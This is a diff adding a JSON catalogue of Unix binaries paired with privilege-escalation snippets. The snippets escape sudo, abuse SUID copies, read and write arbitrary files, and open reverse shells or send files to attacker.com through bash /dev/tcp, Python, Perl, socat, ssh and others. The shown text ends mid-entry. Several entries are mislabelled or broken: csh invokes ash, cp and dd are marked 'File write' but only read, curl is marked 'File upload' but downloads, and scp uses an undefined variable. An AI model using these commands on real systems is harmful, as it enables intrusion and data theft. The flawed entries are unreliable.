@@ -1,0 +1,578 @@
+{
+  "apt": {
+    "Shell": "sudo apt-get changelog apt\n!/bin/sh",
+    "Sudo": "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt install -c $TF sl"
+  },
+  "aria2c": {
+    "Command": "sudo sh -c 'cp $(which aria2c) .; chmod +s ./aria2c'\n\nCOMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x"
+  },
+  "arp": {
+    "File read": "sudo sh -c 'cp $(which arp) .; chmod +s ./arp'\n\nLFILE=file_to_read\n./arp -v -f \"$LFILE\""
+  },
+  "ash": {
+    "Shell": "export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'"
+  },
+  "awk": {
+    "Shell": "RHOST=attacker.com\nRPORT=12345\nawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
+  },
+  "base32": {
+    "File read": "sudo sh -c 'cp $(which base32) .; chmod +s ./base32'\n\nLFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode"
+  },
+  "base64": {
+    "File read": "sudo sh -c 'cp $(which base64) .; chmod +s ./base64'\n\nLFILE=file_to_read\n./base64 \"$LFILE\" | base64 --decode"
+  },
+  "bash": {
+    "Shell": "export RHOST=attacker.com\nexport RPORT=12345\nbash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'"
+  },
+  "bpftrace": {
+    "Sudo":"sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'\n\nTF=$(mktemp)\necho 'BEGIN {system(\"/bin/sh\");exit()' >$TF\nsudo bpftrace $TF\n\nsudo bpftrace -c /bin/sh -e 'END {exit()}'"
+   },
+  "bundler": {
+    "Shell": "sudo bundler help\n!/bin/sh"
+  },
+  "busctl": {
+    "Shell": "sudo busctl --show-machine\n!/bin/sh"
+  },
+  "busybox": {
+    "Shell": "LPORT=12345\nbusybox httpd -f -p $LPORT -h ."
+  },
+  "byebug": {
+    "Shell": "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue"
+  },
+  "cancel": {
+   "File upload":"RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\ncancel -u \"$(cat $LFILE)\" -h $RHOST:$RPORT"
+  },
+  "cat": {
+    "File read": "sudo sh -c 'cp $(which cat) .; chmod +s ./cat'\n\nLFILE=file_to_read\n./cat \"$LFILE\""
+  },
+  "chmod": {
+    "SUID": "LFILE=file_to_change\nsudo chmod 0777 $LFILE"
+  },
+  "chown": {
+    "SUID": "LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE"
+  },
+  "chroot": {
+    "SUID": "sudo chroot /"
+  },
+  "cobc": {
+    "Shell": "TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x"
+  },
+  "cp": {
+    "File write": "LFILE=file_to_read\ncp \"$LFILE\" /dev/stdout"
+  },
+  "cpan": {
+    "Shell": "export RHOST=localhost\nexport RPORT=9000\ncpan\n! use Socket; my $i=\"$ENV{RHOST}\"; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/sh -i\");};"
+  },
+  "cpulimit": {
+    "Shell": "sudo cpulimit -l 100 -f /bin/sh"
+  },
+  "crash": {
+    "Shell": "COMMAND='/usr/bin/id'\nCRASHPAGER=\"$COMMAND\" crash -h"
+  },
+  "crontab": {
+    "Command": "sudo crontab -e"
+  },
+  "csh": {
+    "Shell": "export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'"
+  },
+  "curl": {
+    "File upload": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\ncurl $URL -o $LFILE"
+  },
+  "cut": {
+    "File read": "sudo sh -c 'cp $(which cut) .; chmod +s ./cut'\n\nLFILE=file_to_read\n./cut -d \"\" -f1 \"$LFILE\""
+  },
+  "dash": {
+    "Shell": "export LFILE=file_to_write\ndash -c 'echo DATA > $LFILE'"
+  },
+  "date": {
+    "File read": "sudo sh -c 'cp $(which date) .; chmod +s ./date'\n\nLFILE=file_to_read\n./date -f $LFILE"
+  },
+  "dd": {
+    "File write": "LFILE=file_to_read\ndd if=$LFILE"
+  },
+  "dialog": {
+    "File read": "sudo sh -c 'cp $(which dialog) .; chmod +s ./dialog'\n\nLFILE=file_to_read\n./dialog --textbox \"$LFILE\" 0 0"
+  },
+  "diff": {
+    "File read": "sudo sh -c 'cp $(which diff) .; chmod +s ./diff'\n\nLFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE"
+  },
+  "dmesg": {
+    "Shell": "LFILE=file_to_read\ndmesg -rF \"$LFILE\""
+  },
+  "dmsetup": {
+    "SUID": "sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'"
+  },
+  "dnf": {
+   "Sudo":"TF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n\nsudo dnf install -y x-1.0-1.noarch.rpm"
+  },
+  "docker": {
+    "Shell": "CONTAINER_ID=\"$(docker run -d alpine)\" # or existing\nTF=$(mktemp)\necho \"DATA\" > $TF\ndocker cp $TF $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF file_to_write"
+  },
+  "dpkg": {
+    "Shell": "sudo dpkg -l\n!/bin/sh",
+    "Sudo": "sudo dpkg -i x_1.0_all.deb"
+  },
+  "easy_install": {
+    "Shell": "export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp -d)\necho 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' > $TF/setup.py\neasy_install $TF"
+  },
+  "eb": {
+    "Shell": "sudo eb logs\n!/bin/sh"
+  },
+  "ed": {
+    "Shell": "ed file_to_write\na\nDATA\n.\nw\nq"
+  },
+  "emacs": {
+    "Shell": "emacs file_to_write\nDATA\nC-x C-s"
+  },
+  "env": {
+    "Shell": "sudo sh -c 'cp $(which env) .; chmod +s ./env'\n\n./env /bin/sh -p"
+  },
+  "eqn": {
+    "File read": "sudo sh -c 'cp $(which eqn) .; chmod +s ./eqn'\n\nLFILE=file_to_read\n./eqn \"$LFILE\""
+  },
+  "expand": {
+    "File read": "sudo sh -c 'cp $(which expand) .; chmod +s ./expand'\n\nLFILE=file_to_read\n./expand \"$LFILE\""
+  },
+  "expect": {
+    "Shell": "sudo sh -c 'cp $(which expect) .; chmod +s ./expect'\n\n./expect -c 'spawn /bin/sh -p;interact'"
+  },
+  "facter": {
+    "Shell": "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo FACTERLIB=$TF facter"
+  },
+  "file": {
+    "File read": "sudo sh -c 'cp $(which file) .; chmod +s ./file'\n\nLFILE=file_to_read\n./file -f $LFILE"
+  },
+  "find": {
+    "Shell": "sudo sh -c 'cp $(which find) .; chmod +s ./find'\n\n./find . -exec /bin/sh -p \\; -quit"
+  },
+  "finger": {
+    "File upload": "RHOST=attacker.com\nLFILE=file_to_save\nfinger x@$RHOST | base64 -d > \"$LFILE\""
+  },
+  "flock": {
+    "Shell": "sudo sh -c 'cp $(which flock) .; chmod +s ./flock'\n\n./flock -u / /bin/sh -p"
+  },
+  "fmt": {
+    "File read": "sudo sh -c 'cp $(which fmt) .; chmod +s ./fmt'\n\nLFILE=file_to_read\n./fmt -999 \"$LFILE\""
+  },
+  "fold": {
+    "File read": "sudo sh -c 'cp $(which fold) .; chmod +s ./fold'\n\nLFILE=file_to_read\n./fold -w99999999 \"$LFILE\""
+  },
+  "ftp": {
+    "Shell": "RHOST=attacker.com\nftp $RHOST\nput file_to_send"
+  },
+  "gawk": {
+    "Shell": "RHOST=attacker.com\nRPORT=12345\ngawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
+  },
+  "gcc": {
+    "Shell": "sudo gcc -wrapper /bin/sh,-s ."
+  },
+  "gdb": {
+    "Shell": "export RHOST=attacker.com\nexport RPORT=12345\ngdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' -ex quit"
+  },
+  "gem": {
+    "Shell": "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc"
+  },
+  "genisoimage": {
+    "File read": "LFILE=file_to_read\nsudo genisoimage -q -o - \"$LFILE\""
+  },
+  "gimp": {
+    "Shell": "export RHOST=attacker.com\nexport RPORT=12345\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'"
+  },
+  "git": {
+    "Shell": "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help",
+    "Sudo": "sudo git -p help config\n!/bin/sh",
+    "Limited SUID": "sudo git branch --help config\n!/bin/sh"
+  },
+  "grep": {
+    "File read": "sudo sh -c 'cp $(which grep) .; chmod +s ./grep'\n\nLFILE=file_to_read\n./grep '' $LFILE"
+  },
+  "gtester": {
+    "Shell": "sudo sh -c 'cp $(which gtester) .; chmod +s ./gtester'\n\nTF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF"
+  },
+  "hd": {
+    "File read": "sudo sh -c 'cp $(which hd) .; chmod +s ./hd'\n\nLFILE=file_to_read\n./hd \"$LFILE\""
+  },
+  "head": {
+    "File read": "sudo sh -c 'cp $(which head) .; chmod +s ./head'\n\nLFILE=file_to_read\n./head -c1G \"$LFILE\""
+  },
+  "hexdump": {
+    "File read": "sudo sh -c 'cp $(which hexdump) .; chmod +s ./hexdump'\n\nLFILE=file_to_read\n./hexdump -C \"$LFILE\""
+  },
+  "highlight": {
+    "File read": "sudo sh -c 'cp $(which highlight) .; chmod +s ./highlight'\n\nLFILE=file_to_read\n./highlight --no-doc --failsafe \"$LFILE\""
+  },
+  "iconv": {
+    "File write": "LFILE=file_to_read\niconv -f 8859_1 -t 8859_1 \"$LFILE\""
+  },
+  "iftop": {
+    "Shell": "sudo iftop\n!/bin/sh"
+  },
+  "ionice": {
+    "Shell": "sudo sh -c 'cp $(which ionice) .; chmod +s ./ionice'\n\n./ionice /bin/sh -p"
+  },
+  "ip": {
+    "File read": "sudo sh -c 'cp $(which ip) .; chmod +s ./ip'\n\nLFILE=file_to_read\n./ip -force -batch \"$LFILE\"",
+    "SUID": "sudo sh -c 'cp $(which ip) .; chmod +s ./ip'\n\n./ip netns add foo\n./ip netns exec foo /bin/sh -p\n./ip netns delete foo"
+  },
+  "irb": {
+    "Shell": "export RHOST='127.0.0.1'\nexport RPORT=9000\nirb\nrequire 'socket'; exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read} end"
+  },
+  "jjs": {
+    "Shell": "export RHOST=attacker.com\nexport RPORT=12345\necho 'var host=Java.type(\"java.lang.System\").getenv(\"RHOST\");\nvar port=Java.type(\"java.lang.System\").getenv(\"RPORT\");\nvar ProcessBuilder = Java.type(\"java.lang.ProcessBuilder\");\nvar p=new ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();\nvar Socket = Java.type(\"java.net.Socket\");\nvar s=new Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(\"java.lang.Thread\").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs"
+  },
+  "journalctl": {
+    "Shell": "sudo journalctl\n!/bin/sh"
+  },
+  "jq": {
+    "File read": "sudo sh -c 'cp $(which jq) .; chmod +s ./jq'\n\nLFILE=file_to_read\n./jq -Rr . \"$LFILE\""
+  },
+  "jrunscript": {
+    "Shell": "export RHOST=attacker.com\nexport RPORT=12345\njrunscript -e 'var host='\"'\"\"$RHOST\"\"'\"'; var port='\"$RPORT\"';\nvar p=new java.lang.ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();\nvar s=new java.net.Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){\nwhile(pi.available()>0)so.write(pi.read());\nwhile(pe.available()>0)so.write(pe.read());\nwhile(si.available()>0)po.write(si.read());\nso.flush();po.flush();\njava.lang.Thread.sleep(50);\ntry {p.exitValue();break;}catch (e){}};p.destroy();s.close();'"
+  },
+  "ksh": {
+    "Shell": "export RHOST=attacker.com\nexport RPORT=12345\nksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'"
+  },
+  "ksshell": {
+    "File read": "sudo sh -c 'cp $(which ksshell) .; chmod +s ./ksshell'\n\nLFILE=file_to_read\n./ksshell -i $LFILE"
+  },
+  "ld.so": {
+    "Shell": "sudo sh -c 'cp $(which ld.so) .; chmod +s ./ld.so'\n\n./ld.so /bin/sh -p"
+  },
+  "ldconfig": {
+    "Sudo": "sudo sh -c 'cp $(which ldconfig) .; chmod +s ./ldconfig'\n\nTF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\n./ldconfig -f \"$TF/conf\""
+  },
+  "less": {
+    "Shell": "echo DATA | less\nsfile_to_write\nq",
+    "File write": "less file_to_write\nv"
+  },
+  "logsave": {
+    "Shell": "sudo sh -c 'cp $(which logsave) .; chmod +s ./logsave'\n\n./logsave /dev/null /bin/sh -i -p"
+  },
+  "look": {
+    "File read": "sudo sh -c 'cp $(which look) .; chmod +s ./look'\n\nLFILE=file_to_read\n./look '' \"$LFILE\""
+  },
+  "ltrace": {
+    "Shell": "sudo ltrace -b -L /bin/sh"
+  },
+  "lua": {
+    "Shell": "export RHOST=attacker.com\nexport RPORT=12345\nlua -e 'local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'"
+  },
+  "lwp-download": {
+    "File download": "sudo sh -c 'cp $(which lwp-download) .; chmod +s ./lwp-download'\n\nURL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./lwp-download $URL $LFILE"
+  },
+  "lwp-request": {
+    "File read": "sudo sh -c 'cp $(which lwp-request) .; chmod +s ./lwp-request'\n\nLFILE=file_to_read\n./lwp-request \"file://$LFILE\""
+  },
+  "mail": {
+    "Shell": "sudo mail --exec='!/bin/sh'"
+  },
+  "make": {
+    "Shell": "LFILE=file_to_write\nmake -s --eval=\"\\$(file >$LFILE,DATA)\" ."
+  },
+  "man": {
+    "Shell": "man file_to_read"
+  },
+  "mawk": {
+    "Shell": "LFILE=file_to_write\nmawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'"
+  },
+  "more": {
+    "Shell": "more file_to_read"
+  },
+  "mount": {
+    "Sudo": "sudo mount -o bind /bin/sh /bin/mount\nsudo mount"
+  },
+  "mtr": {
+    "File read": "LFILE=file_to_read\nsudo mtr --raw -F \"$LFILE\""
+  },
+  "mv": {
+    "SUID": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE"
+  },
+  "mysql": {
+    "Shell": "mysql --default-auth ../../../../../path/to/lib"
+  },
+  "nano": {
+    "Shell": "nano file_to_write\nDATA\n^O"
+  },
+  "nawk": {
+    "Shell": "RHOST=attacker.com\nRPORT=12345\nnawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
+  },
+  "nc": {
+    "Reverse shell": "LPORT=12345\nnc -l -p $LPORT -e /bin/sh"
+  },
+  "nice": {
+    "Shell": "sudo sh -c 'cp $(which nice) .; chmod +s ./nice'\n\n./nice /bin/sh -p"
+  },
+  "nl": {
+    "File read": "sudo sh -c 'cp $(which nl) .; chmod +s ./nl'\n\nLFILE=file_to_read\n./nl -bn -w1 -s '' $LFILE"
+  },
+  "nmap": {
+    "Shell": "export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp)\necho 'local s=require(\"socket\");\nlocal t=assert(s.tcp());\nt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\nwhile true do\n  local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n  local b=assert(f:read(\"*a\"));t:send(b);\nend;\nf:close();t:close();' > $TF\nnmap --script=$TF"
+  },
+  "node": {
+    "Shell": "export RHOST=attacker.com\nexport RPORT=12345\nnode -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nnet.connect(process.env.RPORT, process.env.RHOST, function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n  sh.stderr.pipe(this);\n});'"
+  },
+  "nohup": {
+    "Shell": "COMMAND='/usr/bin/id'\nnohup \"$COMMAND\"\ncat nohup.out"
+  },
+  "nroff": {
+    "Shell": "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nsudo GROFF_BIN_PATH=$TF nroff"
+  },
+  "nsenter": {
+    "Shell": "sudo nsenter /bin/sh"
+  },
+  "od": {
+    "File read": "sudo sh -c 'cp $(which od) .; chmod +s ./od'\n\nLFILE=file_to_read\n./od -An -c -w9999 \"$LFILE\""
+  },
+  "openssl": {
+    "Reverse shell": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nopenssl s_client -quiet -connect $RHOST:$RPORT < \"$LFILE\""
+  },
+  "pdb": {
+    "Shell": "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\nsudo pdb $TF\ncont"
+  },
+  "perl": {
+    "Shell": "export RHOST=attacker.com\nexport RPORT=12345\nperl -e 'use Socket;$i=\"$ENV{RHOST}\";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+  },
+  "pg": {
+    "Shell": "pg file_to_read"
+  },
+  "php": {
+    "Shell": "export CMD=\"id\"\nphp -r '$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));$h = @proc_open(getenv(\"CMD\"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'"
+  },
+  "pic": {
+    "Shell": "sudo pic -U\n.PS\nsh X sh X"
+  },
+  "pico": {
+    "Shell": "pico file_to_write\nDATA\n^O"
+  },
+  "pip": {
+    "Shell": "export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp -d)\necho 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' > $TF/setup.py\npip install $TF"
+  },
+  "pkexec": {
+   "Sudo": "sudo pkexec /bin/sh"
+  },
+  "pry": {
+    "Shell": "sudo pry\nsystem(\"/bin/sh\")"
+  },
+  "puppet": {
+    "Shell": "LFILE=\"/tmp/file_to_write\"\npuppet apply -e \"file { '$LFILE': content => 'DATA' }\""
+  },
+  "python": {
+    "Shell": "export RHOST=attacker.com\nexport RPORT=12345\npython -c 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'"
+  },
+  "rake": {
+    "Shell": "sudo rake -p '`/bin/sh 1>&0`'"
+  },
+  "readelf": {
+    "File read": "sudo sh -c 'cp $(which readelf) .; chmod +s ./readelf'\n\nLFILE=file_to_read\n./readelf -a @$LFILE"
+  },
+  "red": {
+    "File write": "red file_to_read\n,p\nq"
+  },
+  "redcarpet": {
+    "File read": "LFILE=file_to_read\nsudo redcarpet \"$LFILE\""
+  },
+  "restic": {
+    "File upload": "sudo sh -c 'cp $(which restic) .; chmod +s ./restic'\n\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\""
+  },
+  "rlogin": {
+    "File upload":"RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nrlogin -l \"$(cat $LFILE)\" -p $RPORT $RHOST"
+},
+  "rlwrap": {
+    "Shell": "LFILE=file_to_write\nrlwrap -l \"$LFILE\" echo DATA"
+  },
+  "rpm": {
+    "Shell": "sudo sh -c 'cp $(which rpm) .; chmod +s ./rpm'\n\n./rpm --eval '%{lua:os.execute(\"/bin/sh\", \"-p\")}'"
+  },
+  "rpmquery": {
+    "Shell": "sudo sh -c 'cp $(which rpmquery) .; chmod +s ./rpmquery'\n\n./rpmquery --eval '%{lua:posix.exec(\"/bin/sh\", \"-p\")}'"
+  },
+  "rsync": {
+    "Shell": "sudo sh -c 'cp $(which rsync) .; chmod +s ./rsync'\n\n./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
+  },
+  "ruby": {
+    "Shell": "export RHOST=attacker.com\nexport RPORT=12345\nruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+  },
+  "run-mailcap": {
+    "Shell": "run-mailcap --action=edit file_to_read"
+  },
+  "run-parts": {
+    "Shell": "sudo sh -c 'cp $(which run-parts) .; chmod +s ./run-parts'\n\n./run-parts --new-session --regex '^sh$' /bin --arg='-p'"
+  },
+  "rvim": {
+    "Shell": "export RHOST=attacker.com\nexport RPORT=12345\nrvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'"
+  },
+  "scp": {
+    "Shell": "RPATH=user@attacker.com:~/file_to_save\nLPATH=file_to_send\nscp $LFILE $RPATH"
+  },
+  "screen": {
+    "Shell": "LFILE=file_to_write\nscreen -L -Logfile $LFILE echo DATA",
+    "File write": "LFILE=file_to_write\nscreen -L $LFILE echo DATA"
+  },
+  "script": {
+    "Shell": "script -q -c 'echo DATA' file_to_write"
+  },
+  "sed": {
+    "Shell": "sed -n '1e id' /etc/hosts"
+  },
+  "service": {
+    "Shell": "sudo service ../../bin/sh"
+  },
+  "setarch": {
+    "Shell": "sudo sh -c 'cp $(which setarch) .; chmod +s ./setarch'\n\n./setarch $(arch) /bin/sh -p"
+  },
+  "sftp": {
+    "Shell": "RHOST=user@attacker.com\nsftp $RHOST\nput file_to_send file_to_save"
+  },
+  "shuf": {
+    "File write": "LFILE=file_to_read\nshuf -z \"$LFILE\""
+  },
+  "smbclient": {
+    "Shell": "smbclient '\\\\attacker\\share' -c 'put file_to_send where_to_save'"
+  },
+  "socat": {
+    "Shell": "RHOST=attacker.com\nRPORT=12345\nsocat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane"
+  },
+  "soelim": {
+    "File read": "sudo sh -c 'cp $(which soelim) .; chmod +s ./soelim'\n\nLFILE=file_to_read\n./soelim \"$LFILE\""
+  },
+  "sort": {
+    "File read": "sudo sh -c 'cp $(which sort) .; chmod +s ./sort'\n\nLFILE=file_to_read\n./sort -m \"$LFILE\""
+  },
+  "sqlite3": {
+    "Shell": "LFILE=file_to_write\nsqlite3 /dev/null -cmd \".output $LFILE\" 'select \"DATA\";'"
+  },
+  "ssh": {
+    "Shell": "HOST=user@attacker.com\nRPATH=file_to_save\nLPATH=file_to_send\nssh $HOST \"cat > $RPATH\" < $LPATH"
+  },
+  "start-stop-daemon": {
+    "Shell": "sudo sh -c 'cp $(which start-stop-daemon) .; chmod +s ./start-stop-daemon'\n\n./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p"
+  },
+  "stdbuf": {
+    "Shell": "sudo sh -c 'cp $(which stdbuf) .; chmod +s ./stdbuf'\n\n./stdbuf -i0 /bin/sh -p"
+  },
+  "strace": {
+    "Shell": "sudo sh -c 'cp $(which strace) .; chmod +s ./strace'\n\n./strace -o /dev/null /bin/sh -p"
+  },
+  "strings": {
+    "File read": "sudo sh -c 'cp $(which strings) .; chmod +s ./strings'\n\nLFILE=file_to_read\n./strings \"$LFILE\""
+  },
+  "su": {
+    "Sudo": "sudo su"
+  },
+  "sysctl": {
+    "File read": "sudo sh -c 'cp $(which sysctl) .; chmod +s ./sysctl'\n\nLFILE=file_to_read\n./sysctl -n \"/../../$LFILE\""
+  },
+  "systemctl": {
+    "SUID": "TF=$(mktemp)\necho /bin/sh >$TF\nchmod +x $TF\nsudo SYSTEMD_EDITOR=$TF systemctl edit system.slice",
+    "Sudo": "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF"
+  },
+  "tac": {
+    "File read": "sudo sh -c 'cp $(which tac) .; chmod +s ./tac'\n\nLFILE=file_to_read\n./tac -s 'RANDOM' \"$LFILE\""
+  },
+  "tail": {
+    "File read": "sudo sh -c 'cp $(which tail) .; chmod +s ./tail'\n\nLFILE=file_to_read\n./tail -c1G \"$LFILE\""
+  },
+  "tar": {
+    "Shell": "RHOST=attacker.com\nRUSER=root\nRFILE=/tmp/file_to_send.tar\nLFILE=file_to_send\ntar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh"
+  },
+  "taskset": {
+   "Shell": "taskset 1 /bin/sh",
+   "SUID": "sudo sh -c 'cp $(which taskset) .; chmod +s ./taskset'\n./taskset 1 /bin/sh -p",
+   "Sudo": "sudo taskset 1 /bin/sh"
+},
+  "tclsh": {
+    "Shell": "export RHOST=attacker.com\nexport RPORT=12345\necho 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh"
+  },
+  "tcpdump": {
+    "Command": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root"
+  },
+  "tee": {
+    "File write": "sudo sh -c 'cp $(which tee) .; chmod +s ./tee'\n\nLFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\""
+  },
+  "telnet": {
+    "Shell": "RHOST=attacker.com\nRPORT=12345\nTF=$(mktemp -u)\nmkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF"
+  },
+  "tftp": {
+    "File upload": "RHOST=attacker.com\ntftp $RHOST\nget file_to_get"
+  },
+  "time": {
+    "Shell": "sudo sh -c 'cp $(which time) .; chmod +s ./time'\n\n./time /bin/sh -p"
+  },
+  "timeout": {
+    "Shell": "sudo sh -c 'cp $(which timeout) .; chmod +s ./timeout'\n\n./timeout 7d /bin/sh -p"
+  },
+  "tmux": {
+    "Shell": "sudo tmux"
+  },
+  "top": {
+    "Shell": "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc\nsudo top\n# press return twice\nreset"
+  },
+  "ul": {
+    "File read": "sudo sh -c 'cp $(which ul) .; chmod +s ./ul'\n\nLFILE=file_to_read\n./ul \"$LFILE\""
+  },
+  "unexpand": {
+    "File read": "sudo sh -c 'cp $(which unexpand) .; chmod +s ./unexpand'\n\nLFILE=file_to_read\n./unexpand -t99999999 \"$LFILE\""
+  },
+  "uniq": {
+    "File read": "sudo sh -c 'cp $(which uniq) .; chmod +s ./uniq'\n\nLFILE=file_to_read\n./uniq \"$LFILE\""
+  },
+  "unshare": {
